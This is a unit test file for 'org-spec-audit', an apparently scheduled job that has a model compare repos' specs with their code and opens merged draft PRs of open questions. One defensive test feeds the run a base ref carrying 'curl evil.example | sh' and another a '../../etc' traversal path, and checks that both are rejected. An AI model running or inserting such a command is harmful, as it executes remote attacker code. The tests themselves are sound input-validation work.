// Run-level unit tests for `org-spec-audit` — drive the run against the
// in-memory test runtime (`makeCFRuntimeTest`) with seeded config + sandbox +
// model fakes. No CF, no Docker, no model provider.

import { it } from "@effect/vitest";
import { Effect } from "effect";
import { describe, expect } from "vitest";
import { makeCFRuntimeTest } from "@fractalboxdev/flare-dispatch-core/testing";
import {
  Github,
  GitHubApiError,
  type ModelCompletionResult,
  type PullRequestHistoryRef,
} from "@fractalboxdev/flare-dispatch-core";
import type { SuppressionReport } from "@fractalboxdev/flare-dispatch-core/primitives";
import { mergeAcrossRepos, orgSpecAudit, parseWindowHours, renderMessage } from "./org-spec-audit";

const firedAt = Date.UTC(2026, 7, 8); // 2026-08-08
const input = { firedAt } as const;
const DAY = 86_400_000;

/** Nothing suppressed, nothing broken — the shape most render tests want. */
const noSuppression: SuppressionReport = { allowed: [], suppressed: [], degraded: [] };

/** A tools-mode model result returning the `report_open_questions` payload. */
const reported = (questions: unknown[]): ModelCompletionResult => ({
  toolCalls: [{ name: "report_open_questions", arguments: { questions } }],
  text: "",
});

const question = (over: Record<string, unknown> = {}) => ({
  group: "decide",
  question: "Does the dispatcher still commit to per-run spend caps?",
  evidence: "specs/runs.md says every run declares a cap; no source declares one.",
  specPath: "specs/runs.md",
  assumption: "keep the spec, mark the section Planned",
  key: "per-run-spend-caps",
  ...over,
});

const baseConfig = {
  "org-spec-audit.repos": "owner/alpha owner/beta",
  "org-spec-audit.control-repo": "owner/control",
  "org-spec-audit.workers-ai.model": "@cf/meta/llama-3.3-70b-instruct-fp8-fast",
};

/** `baseConfig` with one key genuinely absent — not present-and-undefined. */
const withoutKey = (config: Record<string, string>, drop: string): Record<string, string> =>
  Object.fromEntries(Object.entries(config).filter(([k]) => k !== drop));

/** Specs present, a file tree, and commits inside the window. */
const activeSandbox = {
  "specs/*.md": { exitCode: 0, stdout: "\n===FILE specs/runs.md===\nevery run declares a cap" },
  "head -800": { exitCode: 0, stdout: "specs/runs.md\nsrc/a.ts" },
  "git log --oneline": { exitCode: 0, stdout: "abc feat: thing" },
};

describe("org-spec-audit", () => {
  it.effect("is a no-op when the estate is unset", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { "org-spec-audit.workers-ai.model": "m" },
      sandboxProgram: activeSandbox,
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.reposSwept).toBe(0);
      expect(out.prOpened).toBe(false);
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("merges the same question across repos into one control-plane PR", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: {
        // Both repos raise the same key — the merge is the point of sweeping.
        responses: [reported([question()]), reported([question()])],
      },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.reposSwept).toBe(2);
      expect(out.questionsRaised).toBe(2);
      expect(out.questionsAfterMerge).toBe(1);

      const calls = handles.github.openDraftPullRequestCalls;
      expect(calls).toHaveLength(1);
      expect(calls[0]!.repo).toBe("owner/control");
      expect(calls[0]!.headBranch).toBe("flare-dispatch/spec-audit-questions-2026-08-08");
      // The neutral default — `questions-dir` is unset in `baseConfig`, and no
      // value in this repo names any particular operator's layout.
      expect(calls[0]!.files[0]!.path).toBe("maintenance/questions/2026-08-08.md");
      // Both repos are named as sources on the single merged line.
      expect(calls[0]!.files[0]!.content).toContain("owner/alpha");
      expect(calls[0]!.files[0]!.content).toContain("owner/beta");
      expect(calls[0]!.body).toContain("auto-merge: never");
    }).pipe(Effect.provide(layer));
  });

  // The run holds no default control repo on purpose: a default is a repo
  // somebody else's deployment files pull requests against. Unset must stop the
  // run, and stop it BEFORE the sweep — an hour of model calls whose output has
  // nowhere to go is the expensive way to learn a key is missing.
  it.effect("fails when no control repo is configured, before sweeping anything", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: withoutKey(baseConfig, "org-spec-audit.control-repo"),
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
    });

    return Effect.gen(function* () {
      const exit = yield* Effect.exit(orgSpecAudit.run(input));
      expect(exit._tag).toBe("Failure");
      expect(JSON.stringify(exit)).toContain("org-spec-audit.control-repo");
      // Nothing was cloned, nothing was executed, nothing was proposed.
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
      expect(handles.sandbox.clones).toHaveLength(0);
      expect(handles.sandbox.execs).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("writes where `questions-dir` says, not where the run was born", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { ...baseConfig, "org-spec-audit.questions-dir": "infra/loop/open-questions/" },
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
    });

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);
      const calls = handles.github.openDraftPullRequestCalls;
      expect(calls[0]!.files[0]!.path).toBe("infra/loop/open-questions/2026-08-08.md");
    }).pipe(Effect.provide(layer));
  });

  it.effect("refuses a questions-dir that escapes the repo root", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { ...baseConfig, "org-spec-audit.questions-dir": "../../etc" },
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()])] },
    });

    return Effect.gen(function* () {
      const exit = yield* Effect.exit(orgSpecAudit.run(input));
      expect(exit._tag).toBe("Failure");
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("announces the same text it committed, under a use case", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
    });

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);

      const [notice] = handles.notice.published;
      const file = handles.github.openDraftPullRequestCalls[0]!.files[0]!;
      if (notice === undefined) throw new Error("no notice was published");

      // One rendering, two destinations. A second wording would be a second
      // thing to keep true, and the first question a reader asks about a
      // digest is which copy is the real one.
      expect(notice.text).toBe(file.content);
      // A KIND of message, never a room. The receiver maps this to a channel
      // from its own config; nothing here can name one.
      expect(notice.useCase).toBe("org-spec-audit");
      expect(JSON.stringify(notice)).not.toMatch(/channel/i);
      // The PR link rides as a typed entry, because markup inside `text` would
      // be escaped by the receiver along with everything else.
      expect(notice.links).toEqual([
        { url: "https://github.com/owner/control/pull/1", label: "the questions PR" },
      ]);
    }).pipe(Effect.provide(layer));
  });

  it.effect("keys the notice on the day, so a retried step cannot double-post", () => {
    // The receiver dedups on `<run>:<dedupeKey>` and claims it before posting,
    // so the id has to be a function of the run and the day — never a clock or
    // a random. This is the same string the schedule's idempotency key uses.
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
    });

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);
      expect(handles.notice.published[0]!.dedupeKey).toBe("2026-08-08");
      expect(
        orgSpecAudit.schedules?.[0]?.idempotencyKey({ cron: "45 5 * * *", firedAt }),
      ).toContain("2026-08-08");
    }).pipe(Effect.provide(layer));
  });

  it.effect("keeps the file and the verdict when the notice does not land", () => {
    // The digest is already in git, which is the copy that has to survive. An
    // announcement that failed must not retroactively make the sweep a failure.
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      notice: { outcome: "failed" },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.prOpened).toBe(true);
      expect(out.questionsAfterMerge).toBe(1);
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(1);
    }).pipe(Effect.provide(layer));
  });

  it.effect("skips a repo with no commits in the window, before any model call", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: { ...activeSandbox, "git log --oneline": { exitCode: 0, stdout: "" } },
      modelGateway: { responses: [] },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.reposSwept).toBe(0);
      expect(out.reposSkipped).toBe(2);
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("stays silent when nothing needs an answer", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([]), reported([])] },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.reposSwept).toBe(2);
      expect(out.questionsAfterMerge).toBe(0);
      expect(out.prOpened).toBe(false);
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
      // Empty means silent in the channel too. A digest that fires whether or
      // not there is news is one people stop reading, and by then it has
      // nothing left to spend.
      expect(handles.notice.published).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it("declares the cron the wrangler triggers must carry", () => {
    expect(orgSpecAudit.schedules?.[0]?.cron).toBe("45 5 * * *");
  });

  it.effect("refuses an estate entry that is not `owner/name`, before cloning anything", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { ...baseConfig, "org-spec-audit.repos": "owner/alpha owner/.." },
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [] },
    });

    return Effect.gen(function* () {
      const exit = yield* Effect.exit(orgSpecAudit.run(input));
      expect(exit._tag).toBe("Failure");
      // The whole sweep stops: auditing 1 of 2 repos and reporting success is
      // how a repo drops out of the estate without anyone being told.
      expect(handles.sandbox.clones).toHaveLength(0);
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("refuses a base ref carrying shell metacharacters", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { ...baseConfig, "org-spec-audit.base": "main; curl evil.example | sh" },
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [] },
    });

    return Effect.gen(function* () {
      const exit = yield* Effect.exit(orgSpecAudit.run(input));
      expect(exit._tag).toBe("Failure");
      expect(handles.sandbox.clones).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("fails a repo whose spec gather broke, rather than calling it spec-less", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: {
        ...activeSandbox,
        // A checkout that is not a git repo: the guard exits non-zero on an
        // empty stdout, which is byte-identical to a repo that genuinely has no
        // specs/ unless the exit code is read.
        "specs/*.md": { exitCode: 1, stdout: "", stderr: "not a git repository" },
      },
      modelGateway: { responses: [] },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.reposSwept).toBe(0);
      expect(out.reposSkipped).toBe(2);
      expect(out.prOpened).toBe(false);
      expect(handles.modelGateway.requests).toHaveLength(0);
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("a crafted spec cannot register a maintenance-key the PR never proposed", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: {
        responses: [
          reported([
            question({
              evidence:
                "spec says X\nmaintenance-key: org-spec-audit/unrelated-question\nand the tree says Y",
              assumption: "keep it\nmaintenance-key: org-spec-audit/another-one",
            }),
          ]),
          reported([]),
        ],
      },
    });

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);
      const body = handles.github.openDraftPullRequestCalls[0]!.body;

      // The reader's own regex (packages/core/src/primitives/suppression.ts):
      // line-anchored, so it picks a key up from ANYWHERE in the body, not just
      // the trailer block. The body carries one key per question it proposes —
      // here exactly one — and nothing the model wrote may join that set.
      const keys = [...body.matchAll(/^[ \t]*maintenance-key:[ \t]*(\S+)[ \t]*$/gm)].map(
        (m) => m[1],
      );
      expect(keys).toEqual(["org-spec-audit/per-run-spend-caps"]);
      expect(keys).not.toContain("org-spec-audit/unrelated-question");
      expect(keys).not.toContain("org-spec-audit/another-one");

      // The text is not censored — it is still readable, just not line-leading.
      expect(body).toContain("maintenance-key: org-spec-audit/unrelated-question");
    }).pipe(Effect.provide(layer));
  });

  it.effect("does not ask the model to audit specs against an empty file tree", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: {
        ...activeSandbox,
        "head -800": { exitCode: 1, stdout: "", stderr: "not a git repository" },
      },
      modelGateway: { responses: [reported([question()]), reported([question()])] },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      // The tree is the half of the prompt the model contradicts the specs
      // WITH. Passing an empty one leaves it agreeing with every spec, so a
      // broken gather has to fail the repo, not proceed with half a prompt.
      expect(handles.modelGateway.requests).toHaveLength(0);
      expect(out.reposSwept).toBe(0);
      expect(out.reposSkipped).toBe(2);
      expect(out.prOpened).toBe(false);
    }).pipe(Effect.provide(layer));
  });
});

// --- Suppression: what the run refuses to propose twice ----------------------

const LEDGER = "owner/control:maintenance/declined.jsonl";
const KEY = "org-spec-audit/per-run-spend-caps";

/** A prior proposal carrying the key, closed unmerged `daysAgo` days back. */
const closedProposal = (daysAgo: number, over: Partial<PullRequestHistoryRef> = {}) =>
  ({
    repo: "owner/control",
    number: 7,
    title: "docs(maintenance): open questions",
    body: `maintenance-key: ${KEY}`,
    headBranch: `flare-dispatch/spec-audit-questions-2026-06-0${daysAgo % 9}`,
    state: "closed",
    draft: true,
    url: "https://github.com/owner/control/pull/7",
    createdAt: firedAt - (daysAgo + 5) * DAY,
    // Touched today on purpose: a cooldown dated from `updated_at` would never
    // expire, which is the whole reason `closed_at` is the field that counts.
    updatedAt: firedAt,
    closedAt: firedAt - daysAgo * DAY,
    ...over,
  }) satisfies PullRequestHistoryRef;

/** The runtime the suppression tests share — one question, one control repo. */
const suppressionRuntime = (
  github: NonNullable<Parameters<typeof makeCFRuntimeTest>[0]>["github"],
) =>
  makeCFRuntimeTest({
    config: baseConfig,
    sandboxProgram: activeSandbox,
    modelGateway: { responses: [reported([question()]), reported([question()])] },
    github: { now: firedAt, ...github },
  });

describe("org-spec-audit — suppression", () => {
  it.effect("never re-proposes a question the ledger declined", () => {
    const { layer, handles } = suppressionRuntime({
      files: {
        [LEDGER]: JSON.stringify({
          key: KEY,
          reason: "answered in ADR-0011; the spec is right",
          by: "@ada",
          at: "2026-08-01",
        }),
      },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsAfterMerge).toBe(1);
      expect(out.questionsSuppressed).toBe(1);
      expect(out.prOpened).toBe(false);
      // Nothing left to ask ⇒ no PR at all, and the count still reports why.
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  // The ledger's location is the operator's, like the questions dir. The
  // default this repo ships is a placeholder, and an operator who moves the
  // file must have the run follow it — including in the sentence the PR body
  // prints telling a reviewer where to record a permanent decline.
  it.effect("reads the ledger where `declined-path` says, and says so in the body", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { ...baseConfig, "org-spec-audit.declined-path": "infra/loop/declined.jsonl" },
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: {
        now: firedAt,
        files: { "owner/control:infra/loop/declined.jsonl": "" },
      },
    });

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);
      const calls = handles.github.openDraftPullRequestCalls;
      expect(calls).toHaveLength(1);
      expect(calls[0]!.body).toContain("`infra/loop/declined.jsonl`");
      expect(calls[0]!.body).not.toContain("maintenance/declined.jsonl");
    }).pipe(Effect.provide(layer));
  });

  it.effect("honours a cooldown dated from when the proposal was closed", () => {
    const { layer, handles } = suppressionRuntime({
      pullRequestHistory: [closedProposal(5)],
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsSuppressed).toBe(1);
      expect(out.prOpened).toBe(false);
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
      // And nothing is announced either. Suppression runs BEFORE the notice, so
      // a question a human declined is not re-broadcast into a channel — which
      // is the louder half of re-proposing it, and the one nobody can close.
      expect(handles.notice.published).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("asks again once the cooldown has expired", () => {
    const { layer, handles } = suppressionRuntime({
      pullRequestHistory: [closedProposal(45, { updatedAt: firedAt - 45 * DAY })],
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsSuppressed).toBe(0);
      expect(out.prOpened).toBe(true);
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(1);
    }).pipe(Effect.provide(layer));
  });

  it.effect("does not suppress on a proposal that was merged", () => {
    const { layer } = suppressionRuntime({
      pullRequestHistory: [closedProposal(5, { mergedAt: firedAt - 5 * DAY })],
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsSuppressed).toBe(0);
      expect(out.prOpened).toBe(true);
    }).pipe(Effect.provide(layer));
  });

  it.effect("skips a malformed ledger line and honours the rest", () => {
    const { layer, handles } = suppressionRuntime({
      files: {
        [LEDGER]: [
          "}}} not json at all",
          JSON.stringify({ key: KEY, reason: "settled", by: "@ada", at: "2026-08-01" }),
        ].join("\n"),
      },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsSuppressed).toBe(1);
      expect(handles.io.logs.some((l) => l.level === "warn" && l.msg.includes("not JSON"))).toBe(
        true,
      );
    }).pipe(Effect.provide(layer));
  });

  it.effect("proposes anyway — and says so — when the ledger cannot be read", () => {
    const { layer, handles } = suppressionRuntime({});

    return Effect.gen(function* () {
      // Wrap the fake so only the ledger read fails; every other `github` call
      // (notably the draft-PR write this test asserts on) still records.
      const fake = yield* Github;
      const out = yield* orgSpecAudit.run(input).pipe(
        Effect.provideService(Github, {
          ...fake,
          readTextFile: () => Effect.fail(new GitHubApiError({ status: 500, reason: "transient" })),
        }),
      );

      expect(out.questionsSuppressed).toBe(0);
      expect(out.prOpened).toBe(true);
      const calls = handles.github.openDraftPullRequestCalls;
      expect(calls).toHaveLength(1);
      expect(calls[0]!.body).toContain("Suppression degraded");
      expect(handles.io.logs.some((l) => l.level === "warn" && l.msg.includes("unreadable"))).toBe(
        true,
      );
    }).pipe(Effect.provide(layer));
  });

  it.effect("reports the suppressed count and reason in the PR body and the file", () => {
    // Two questions: one declined, one still open — so a PR is opened AND has
    // something to explain. A shorter list with no explanation reads as "fewer
    // problems", which is the opposite of true.
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: {
        responses: [
          reported([
            question(),
            question({ key: "who-owns-egress", question: "Who owns egress?" }),
          ]),
          reported([]),
        ],
      },
      github: {
        now: firedAt,
        files: {
          [LEDGER]: JSON.stringify({
            key: KEY,
            reason: "answered in ADR-0011",
            by: "@ada",
            at: "2026-08-01",
          }),
        },
      },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsAfterMerge).toBe(2);
      expect(out.questionsSuppressed).toBe(1);
      expect(out.prOpened).toBe(true);

      const call = handles.github.openDraftPullRequestCalls[0]!;
      expect(call.body).toContain("**Suppressed: 1**");
      expect(call.body).toContain("answered in ADR-0011");
      expect(call.body).toContain("suppressed: 1");
      // The message file IS the digest FractalBOT posts — it must say it too.
      expect(call.files[0]!.content).toContain("**Suppressed: 1**");
      expect(call.files[0]!.content).toContain("1 suppressed");
      // The surviving question is still asked; the declined one is gone.
      expect(call.files[0]!.content).toContain("Who owns egress?");
      expect(call.files[0]!.content).not.toContain("Does the dispatcher still commit");
    }).pipe(Effect.provide(layer));
  });

  it.effect("carries one maintenance-key per question, not one per PR", () => {
    // A dated per-PR key would be unique every day and suppress nothing, ever.
    const { layer, handles } = suppressionRuntime({});

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);
      const body = handles.github.openDraftPullRequestCalls[0]!.body;
      expect(body).toContain(`maintenance-key: ${KEY}`);
      expect(body).not.toContain("maintenance-key: org-spec-audit/2026-08-08");
    }).pipe(Effect.provide(layer));
  });

  it.effect("asks about exactly the branch prefix its own proposals use", () => {
    const { layer, handles } = suppressionRuntime({});

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);
      const [call] = handles.github.pullRequestHistoryCalls;
      expect(call).toMatchObject({
        repo: "owner/control",
        headBranchPrefix: "flare-dispatch/spec-audit-questions-",
        state: "all",
      });
      expect(handles.github.openDraftPullRequestCalls[0]!.headBranch).toMatch(
        new RegExp(`^${call!.headBranchPrefix}`),
      );
    }).pipe(Effect.provide(layer));
  });
});

describe("mergeAcrossRepos", () => {
  const raised = (over: Record<string, unknown>) =>
    ({ ...question(), ...over }) as Parameters<typeof mergeAcrossRepos>[0][number];

  it("merges on a normalized key regardless of the model's punctuation", () => {
    const out = mergeAcrossRepos([
      raised({ repo: "o/a", key: "Per-Run Spend Caps" }),
      raised({ repo: "o/b", key: "per_run_spend_caps" }),
    ]);
    expect(out).toHaveLength(1);
    expect(out[0]!.sources.map((s) => s.repo)).toEqual(["o/a", "o/b"]);
  });

  it("counts one repo raising the same key twice as one question", () => {
    const out = mergeAcrossRepos([raised({ repo: "o/a" }), raised({ repo: "o/a" })]);
    expect(out).toHaveLength(1);
    expect(out[0]!.sources).toHaveLength(1);
  });

  it("ranks the most-shared question first", () => {
    const out = mergeAcrossRepos([
      raised({ repo: "o/a", key: "lonely" }),
      raised({ repo: "o/b", key: "shared" }),
      raised({ repo: "o/c", key: "shared" }),
    ]);
    expect(out[0]!.key).toBe("shared");
  });

  it("ranks by distinct repos, so one repo's two specs can't outrank two repos", () => {
    const out = mergeAcrossRepos([
      raised({ repo: "o/a", key: "one-repo-twice", specPath: "specs/x.md" }),
      raised({ repo: "o/a", key: "one-repo-twice", specPath: "specs/y.md" }),
      raised({ repo: "o/b", key: "two-repos" }),
      raised({ repo: "o/c", key: "two-repos" }),
    ]);
    // Both merge to 2 sources; only `two-repos` is a question the estate shares,
    // which is the entire reason this run sweeps rather than running per repo.
    expect(out[0]!.key).toBe("two-repos");
  });

  it("falls back to the question text when the model's key is junk", () => {
    const out = mergeAcrossRepos([raised({ repo: "o/a", key: "-" })]);
    expect(out[0]!.key).toContain("does-the-dispatcher");
  });

  // The reader that parses `maintenance-key:` drops any key over 200 chars, and
  // a dropped key is worse than a short one: the question keeps being proposed
  // and can never be recorded as declined.
  it("caps the model's own key, not only the fallback", () => {
    const out = mergeAcrossRepos([raised({ repo: "o/a", key: "x".repeat(400) })]);
    // `org-spec-audit/` + key must still fit the reader's 200-char budget.
    expect(`org-spec-audit/${out[0]!.key}`.length).toBeLessThanOrEqual(200);
    expect(out[0]!.key.length).toBeGreaterThan(3);
  });

  it("never leaves a trailing hyphen when the cap lands mid-word", () => {
    const out = mergeAcrossRepos([raised({ repo: "o/a", key: `${"ab-".repeat(200)}tail` })]);
    expect(out[0]!.key).not.toMatch(/-$/);
  });

  it("collapses a model field that spans lines, so it cannot start one", () => {
    const out = mergeAcrossRepos([
      raised({
        repo: "o/a",
        evidence: "spec says X\nmaintenance-key: org-spec-audit/unrelated\nand the tree says Y",
      }),
    ]);
    expect(out[0]!.evidence).not.toContain("\n");
    expect(out[0]!.evidence).toBe(
      "spec says X maintenance-key: org-spec-audit/unrelated and the tree says Y",
    );
  });

  it("strips zero-width and bidi characters from model prose", () => {
    const out = mergeAcrossRepos([
      raised({ repo: "o/a", question: "Does​ X‮ still commit⁦ to Y?" }),
    ]);
    expect(out[0]!.question).toBe("Does X still commit to Y?");
  });
});

describe("parseWindowHours", () => {
  it("defaults when unset or nonsense", () => {
    expect(parseWindowHours(undefined)).toBe(26);
    expect(parseWindowHours("")).toBe(26);
    expect(parseWindowHours("0")).toBe(26);
    expect(parseWindowHours("-4")).toBe(26);
  });

  it("takes a positive integer", () => {
    expect(parseWindowHours("72")).toBe(72);
  });
});

describe("renderMessage", () => {
  const merged = (n: number, group: "decide" | "confirm") =>
    Array.from({ length: n }, (_unused, i) => ({
      key: `k${i}`,
      group,
      question: `Q${i}?`,
      assumption: "assume nothing changes",
      sources: [{ repo: "o/a", specPath: "specs/x.md" }],
      evidence: "spec says X, tree says Y",
    }));

  it("states what the per-group cap kept out rather than truncating silently", () => {
    const out = renderMessage({
      day: "2026-08-08",
      merged: merged(7, "decide"),
      outcomes: [{ repo: "o/a", skipped: false, questions: [] }],
      raised: 7,
      suppression: noSuppression,
    });
    expect(out).toContain("2 more in this group, not shown");
    expect(out).toContain("Below the per-group cap: 2");
  });

  it("names the repos it swept and the ones it skipped", () => {
    const out = renderMessage({
      day: "2026-08-08",
      merged: merged(1, "confirm"),
      outcomes: [
        { repo: "o/a", skipped: false, questions: [] },
        { repo: "o/dormant", skipped: true, questions: [] },
      ],
      raised: 1,
      suppression: noSuppression,
    });
    expect(out).toContain("Swept: `o/a`");
    expect(out).toContain("`o/dormant`");
  });

  it("separates a repo that failed from one that was quiet", () => {
    const out = renderMessage({
      day: "2026-08-08",
      merged: merged(1, "confirm"),
      outcomes: [
        { repo: "o/a", skipped: false, questions: [] },
        { repo: "o/dormant", skipped: true, questions: [] },
        { repo: "o/broken", skipped: true, failure: "model call failed (429)", questions: [] },
      ],
      raised: 1,
      suppression: noSuppression,
    });
    // A failure counted as "unchanged" turns an outage into good news.
    expect(out).toContain("1 unchanged or without specs");
    expect(out).toContain("1 failed");
    expect(out).toContain("Failed: `o/broken` (model call failed (429))");
    expect(out).not.toContain("Failed: none");
    // And the caveat lands above the questions, not in a footer.
    expect(out.indexOf("could not be swept")).toBeLessThan(out.indexOf("## Confirm"));
  });

  it("says so explicitly when nothing failed", () => {
    const out = renderMessage({
      day: "2026-08-08",
      merged: merged(1, "confirm"),
      outcomes: [{ repo: "o/a", skipped: false, questions: [] }],
      raised: 1,
      suppression: noSuppression,
    });
    expect(out).toContain("Failed: none");
    expect(out).not.toContain("could not be swept");
  });
});
